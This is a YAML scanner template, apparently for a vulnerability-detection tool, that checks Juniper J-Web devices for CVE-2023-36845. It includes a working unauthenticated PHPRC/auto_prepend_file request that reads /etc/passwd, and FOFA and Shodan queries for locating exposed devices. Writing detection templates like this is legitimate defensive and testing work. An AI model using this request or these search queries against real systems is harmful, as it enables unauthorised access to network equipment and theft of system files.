id: CVE-2023-36845

info:
  name: Juniper J-Web - Remote Code Execution
  author: yaser_s
  severity: high
  verified: true
  description: |
    A PHP External Variable Modification vulnerability in J-Web of Juniper Networks Junos OS on EX Series and SRX Series allows an unauthenticated, network-based attacker to control certain environments variables to execute remote commands
    FOFA: title="Juniper Web Device Manager" || icon_hash="2141724739"
    SHODAN: title:"Juniper" http.favicon.hash:2141724739
  reference:
    - https://vulncheck.com/blog/juniper-cve-2023-36845
    - https://nvd.nist.gov/vuln/detail/CVE-2023-36845
    - https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/
  tags: cve,cve2023,rce,unauth,juniper
  created: 2023/10/11

rules:
  r0:
    request:
      method: POST
      path: /?PHPRC=/dev/fd/0
      body: auto_prepend_file="/etc/passwd"
    expression: response.status == 200 && response.body.bcontains(b"Juniper") && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()